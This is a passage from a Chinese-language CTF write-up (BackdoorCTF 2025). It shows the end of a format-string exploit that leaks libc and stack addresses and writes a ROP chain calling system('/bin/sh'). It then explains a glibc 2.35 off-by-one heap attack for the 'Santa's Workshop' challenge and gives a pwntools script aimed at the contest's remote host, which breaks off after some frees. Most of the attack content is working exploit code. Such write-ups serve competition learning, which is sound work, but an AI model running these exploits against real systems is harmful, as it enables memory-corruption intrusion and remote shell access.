</span></span><span class=line><span class=cl>    <span class=n>format_payload</span> <span class=o>=</span> <span class=nb>bytes</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;A&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=mi>6</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=nb>abs</span><span class=p>(</span><span class=n>byte</span><span class=p>))))</span> <span class=o>+</span> <span class=nb>bytes</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;%</span><span class=si>{</span><span class=n>byte</span> <span class=o>-</span> <span class=p>(</span><span class=mi>6</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=nb>abs</span><span class=p>(</span><span class=n>byte</span><span class=p>))))</span><span class=si>}</span><span class=s1>c&#39;</span><span class=p>,</span> <span class=n>encoding</span><span class=o>=</span><span class=s1>&#39;ASCII&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>sa</span><span class=p>(</span><span class=s2>&#34;Enter your wish &gt;&gt; &#34;</span><span class=p>,</span> <span class=n>format_payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>format_write_addr</span><span class=p>(</span><span class=n>target_addr</span><span class=p>,</span> <span class=n>write_addr</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>6</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>format_write</span><span class=p>(</span><span class=n>target_addr</span> <span class=o>+</span> <span class=n>i</span><span class=p>,</span> <span class=p>(</span><span class=n>write_addr</span> <span class=o>&gt;&gt;</span> <span class=p>(</span><span class=mi>8</span> <span class=o>*</span> <span class=n>i</span><span class=p>))</span> <span class=o>&amp;</span> <span class=mh>0xff</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sh</span> <span class=o>=</span> <span class=n>start</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Your exploit here</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span> <span class=o>*</span> <span class=mi>16</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\xcd</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>sa</span><span class=p>(</span><span class=s2>&#34;Enter your name &gt;&gt; &#34;</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>format_payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;%9$p&#39;</span> <span class=c1># 10 #11</span>
</span></span><span class=line><span class=cl><span class=n>sa</span><span class=p>(</span><span class=s2>&#34;Enter your wish &gt;&gt; &#34;</span><span class=p>,</span> <span class=n>format_payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pie</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>sh</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>14</span><span class=p>),</span> <span class=n>base</span> <span class=o>=</span> <span class=mi>16</span><span class=p>)</span> <span class=o>-</span> <span class=mh>0x13cd</span>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s2>&#34;pie:&#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>pie</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span> <span class=o>*</span> <span class=mi>16</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\xcd</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>sa</span><span class=p>(</span><span class=s2>&#34;Enter your name &gt;&gt; &#34;</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>format_payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;%11$p&#39;</span> <span class=c1># 10 #11</span>
</span></span><span class=line><span class=cl><span class=n>sa</span><span class=p>(</span><span class=s2>&#34;Enter your wish &gt;&gt; &#34;</span><span class=p>,</span> <span class=n>format_payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc_base</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>sh</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>14</span><span class=p>),</span> <span class=n>base</span> <span class=o>=</span> <span class=mi>16</span><span class=p>)</span><span class=o>-</span><span class=mh>0x2a1ca</span>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s2>&#34;stack:&#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>libc_base</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span> <span class=o>*</span> <span class=mi>16</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\xcd</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>sa</span><span class=p>(</span><span class=s2>&#34;Enter your name &gt;&gt; &#34;</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>format_payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;%10$p&#39;</span> <span class=c1># 10 #11</span>
</span></span><span class=line><span class=cl><span class=n>sa</span><span class=p>(</span><span class=s2>&#34;Enter your wish &gt;&gt; &#34;</span><span class=p>,</span> <span class=n>format_payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>stack</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>sh</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>14</span><span class=p>),</span> <span class=n>base</span> <span class=o>=</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s2>&#34;stack:&#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>stack</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>libc_start_main_ret_stack</span> <span class=o>=</span> <span class=n>stack</span> <span class=o>-</span> <span class=mh>0x98</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>rdi_ret</span> <span class=o>=</span> <span class=mh>0x000000000010f78b</span> <span class=o>+</span> <span class=n>libc_base</span>
</span></span><span class=line><span class=cl><span class=n>format_write_addr</span><span class=p>(</span><span class=n>libc_start_main_ret_stack</span><span class=p>,</span> <span class=n>rdi_ret</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>format_write_addr</span><span class=p>(</span><span class=n>libc_start_main_ret_stack</span> <span class=o>+</span> <span class=mh>0x8</span><span class=p>,</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=nb>next</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=s2>&#34;/bin/sh&#34;</span><span class=p>)))</span>
</span></span><span class=line><span class=cl><span class=n>format_write_addr</span><span class=p>(</span><span class=n>libc_start_main_ret_stack</span> <span class=o>+</span> <span class=mh>0x10</span><span class=p>,</span> <span class=n>rdi_ret</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>format_write_addr</span><span class=p>(</span><span class=n>libc_start_main_ret_stack</span> <span class=o>+</span> <span class=mh>0x18</span><span class=p>,</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s2>&#34;Enter your name &gt;&gt; &#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=mi>123</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s2>&#34;Enter your wish &gt;&gt; &#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=mi>123</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></div><h2 id=santas-workshop>Santa&rsquo;s Workshop<a hidden class=anchor aria-hidden=true href=#santas-workshop>#</a></h2><p>堆题，<code>libc2.35</code></p><p><img alt=image-20251208170008837 loading=lazy src=/posts/ctf/backdoorctf2025-writeup/assets/image-20251208170008837.png></p><p>第9行，会泄露<code>heapbase</code>，<em>感觉没必要给，可以通过large_bin泄露</em></p><p>不截图每个函数了，大致说一下有哪些功能和漏洞</p><p>非常完备，有<code>malloc</code>，<code>free</code>，<code>show</code>，<code>edit</code>，<code>edit</code>存在溢出一个<code>\x00</code>的漏洞</p><p>再关注一下<code>case 5</code>和<code>case 6</code></p><p><img alt=image-20251208170303294 loading=lazy src=/posts/ctf/backdoorctf2025-writeup/assets/image-20251208170303294.png></p><p><img alt=image-20251208170313350 loading=lazy src=/posts/ctf/backdoorctf2025-writeup/assets/image-20251208170313350.png></p><p>简单来说就是，<code>load_secret</code>会分配一个堆块，往里面写上随机的<code>secret</code>，然后可以调用<code>master_key</code>，检查你的输入，与<code>secret</code>对比，相同就给你<code>flag</code></p><p>所以这道题要做的就是利用溢出一个<code>\x00</code>的漏洞去泄露一个堆块的内容</p><p>第一反应是经典的<code>off-by-one</code></p><p><a href=https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/off-by-one/>https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/off-by-one/</a></p><p>但是<code>libc2.29</code>加入了保护</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span><span class=nf>__glibc_unlikely</span> <span class=p>(</span><span class=nf>chunksize</span><span class=p>(</span><span class=n>p</span><span class=p>)</span> <span class=o>!=</span> <span class=n>prevsize</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=nf>malloc_printerr</span> <span class=p>(</span><span class=s>&#34;corrupted size vs. prev_size while consolidating&#34;</span><span class=p>);</span>
</span></span></code></pre></div><p>所以这种办法行不通</p><p>想一想这种经典办法为什么会被这个保护拦截，因为他是控制<code>presize</code>，使得<code>prev_chunk</code>是一个<strong>真实的被<code>free</code>了的<code>chunk</code></strong>（里面还隔几个chunk，从而造成重叠），为什么要这样做呢？</p><p>因为在<code>unlink</code>的时候会检查</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nf>__builtin_expect</span> <span class=p>(</span><span class=n>fd</span><span class=o>-&gt;</span><span class=n>bk</span> <span class=o>!=</span> <span class=n>p</span> <span class=o>||</span> <span class=n>bk</span><span class=o>-&gt;</span><span class=n>fd</span> <span class=o>!=</span> <span class=n>p</span><span class=p>,</span> <span class=mi>0</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=nf>malloc_printerr</span> <span class=p>(</span><span class=s>&#34;corrupted double-linked list&#34;</span><span class=p>);</span>
</span></span></code></pre></div><p>如果不是一个真实的<code>chunk</code>，这个检查很难通过，但是我们现在有了已经泄露的<code>heapbase</code>，可以伪造<code>fd</code>和<code>bk</code>均为<code>fake_chunk</code>的地址，这样就没必要使得<code>prev_chunk</code>是一个<strong>真实的被<code>free</code>了的<code>chunk</code></strong></p><p>所以直接一条龙服务，在一个<code>chunk</code>里面放假的<code>chunk header</code>，<code>fd</code>，<code>bk</code>即可，然后利用<code>off-by-one</code>，但是<code>prev chunk</code>是我们的假<code>chunk</code>即可。这样就可以造成堆重叠，从而泄露<code>secret</code></p><p>exp</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwncli</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>os</span><span class=o>=</span><span class=s1>&#39;linux&#39;</span><span class=p>,</span><span class=n>arch</span> <span class=o>=</span> <span class=s1>&#39;amd64&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#context.terminal = [&#39;tmux&#39;, &#39;new-window&#39;, &#39;-n&#39;, &#39;debug&#39; ]</span>
</span></span><span class=line><span class=cl><span class=n>filename</span> <span class=o>=</span> <span class=s2>&#34;chall&#34;</span> <span class=o>+</span> <span class=s2>&#34;_patched&#34;</span>
</span></span><span class=line><span class=cl><span class=n>libcname</span> <span class=o>=</span> <span class=s2>&#34;/home/wgg/.config/cpwn/pkgs/2.35-0ubuntu3.11/amd64/libc6_2.35-0ubuntu3.11_amd64/lib/x86_64-linux-gnu/libc.so.6&#34;</span>
</span></span><span class=line><span class=cl><span class=n>host</span> <span class=o>=</span> <span class=s2>&#34;remote.infoseciitr.in&#34;</span>
</span></span><span class=line><span class=cl><span class=n>port</span> <span class=o>=</span> <span class=mi>8000</span>
</span></span><span class=line><span class=cl><span class=n>elf</span> <span class=o>=</span> <span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>filename</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>libcname</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>libcname</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>gs</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>b main
</span></span></span><span class=line><span class=cl><span class=s1>set debug-file-directory /home/wgg/.config/cpwn/pkgs/2.35-0ubuntu3.11/amd64/libc6-dbg_2.35-0ubuntu3.11_amd64/usr/lib/debug
</span></span></span><span class=line><span class=cl><span class=s1>set directories /home/wgg/.config/cpwn/pkgs/2.35-0ubuntu3.11/amd64/glibc-source_2.35-0ubuntu3.11_all/usr/src/glibc/glibc-2.35
</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>sa</span><span class=p>(</span><span class=n>a</span><span class=p>,</span><span class=n>b</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>sla</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>start</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>GDB</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>gdb</span><span class=o>.</span><span class=n>debug</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>,</span> <span class=n>gdbscript</span> <span class=o>=</span> <span class=n>gs</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>args</span><span class=o>.</span><span class=n>REMOTE</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>process</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># ========== 程序交互函数 ==========</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>prepare_gift</span><span class=p>(</span><span class=n>slot</span><span class=p>,</span> <span class=n>size</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    功能1: 分配堆块
</span></span></span><span class=line><span class=cl><span class=s2>    参数:
</span></span></span><span class=line><span class=cl><span class=s2>        slot: 礼物槽位 (0-15)
</span></span></span><span class=line><span class=cl><span class=s2>        size: 堆块大小 (0x50 &lt; size &lt;= 0x1000)
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;&gt; &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Gift Slot: &#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>slot</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Gift Size: &#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>rewrite_card</span><span class=p>(</span><span class=n>slot</span><span class=p>,</span> <span class=n>data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    功能2: 写入数据到堆块
</span></span></span><span class=line><span class=cl><span class=s2>    参数:
</span></span></span><span class=line><span class=cl><span class=s2>        slot: 礼物槽位 (0-15)
</span></span></span><span class=line><span class=cl><span class=s2>        data: 要写入的数据 (bytes)
</span></span></span><span class=line><span class=cl><span class=s2>    注意: 存在Off-by-One漏洞！如果len(data) == size，会溢出1字节
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;&gt; &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;2&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Gift Slot: &#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>slot</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>sa</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Card Message: &#34;</span><span class=p>,</span> <span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>check_gift</span><span class=p>(</span><span class=n>slot</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    功能3: 读取堆块内容
</span></span></span><span class=line><span class=cl><span class=s2>    参数:
</span></span></span><span class=line><span class=cl><span class=s2>        slot: 礼物槽位 (0-15)
</span></span></span><span class=line><span class=cl><span class=s2>    返回: 堆块内容 (bytes)
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;&gt; &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;3&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Gift Slot: &#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>slot</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Gift Contents: &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>sh</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>deliver_gift</span><span class=p>(</span><span class=n>slot</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    功能4: 释放堆块
</span></span></span><span class=line><span class=cl><span class=s2>    参数:
</span></span></span><span class=line><span class=cl><span class=s2>        slot: 礼物槽位 (0-15)
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;&gt; &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;4&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Gift Slot: &#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>slot</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>master_key</span><span class=p>(</span><span class=n>secret</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    功能5: 验证密钥并获取flag
</span></span></span><span class=line><span class=cl><span class=s2>    参数:
</span></span></span><span class=line><span class=cl><span class=s2>        secret: 16字节密钥 (bytes)
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;&gt; &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;5&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sa</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Enter Santa&#39;s Secret Code: &#34;</span><span class=p>,</span> <span class=n>secret</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>load_secret</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    功能6: 从/dev/urandom加载16字节随机密钥
</span></span></span><span class=line><span class=cl><span class=s2>    注意: 会在堆上分配0x20字节chunk存储密钥但不释放！
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;&gt; &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;6&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>close_workshop</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    功能7: 退出程序
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;&gt; &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;7&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># ========== 辅助函数 ==========</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>leak_heap</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    程序启动时会自动泄露一个堆地址
</span></span></span><span class=line><span class=cl><span class=s2>    返回: 堆地址
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Ho...Ho...Ho..&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>heap_leak</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>sh</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>14</span><span class=p>),</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Heap leak: </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>heap_leak</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>heap_leak</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sh</span> <span class=o>=</span> <span class=n>start</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 1. 接收banner和泄露的堆地址</span>
</span></span><span class=line><span class=cl><span class=n>heap_leak</span> <span class=o>=</span> <span class=n>leak_heap</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>heap_base</span> <span class=o>=</span> <span class=n>heap_leak</span> <span class=o>-</span> <span class=mh>0x2a0</span>  <span class=c1># 需要根据实际调试调整偏移</span>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Heap base: </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>heap_base</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>prepare_gift</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x588</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>load_secret</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>prepare_gift</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x58</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>prepare_gift</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=mh>0x4f8</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rewrite_card</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span> <span class=o>*</span> <span class=mh>0xc0</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x551</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>heap_base</span> <span class=o>+</span> <span class=mh>0x380</span><span class=p>)</span> <span class=o>*</span> <span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>rewrite_card</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span> <span class=o>*</span> <span class=mh>0x50</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x550</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>prepare_gift</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=mh>0x500</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>prepare_gift</span><span class=p>(</span><span class=mi>6</span><span class=p>,</span> <span class=mh>0x68</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>prepare_gift</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span> <span class=mh>0x500</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>prepare_gift</span><span class=p>(</span><span class=mi>5</span><span class=p>,</span> <span class=mh>0x68</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>deliver_gift</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>deliver_gift</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>deliver_gift</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
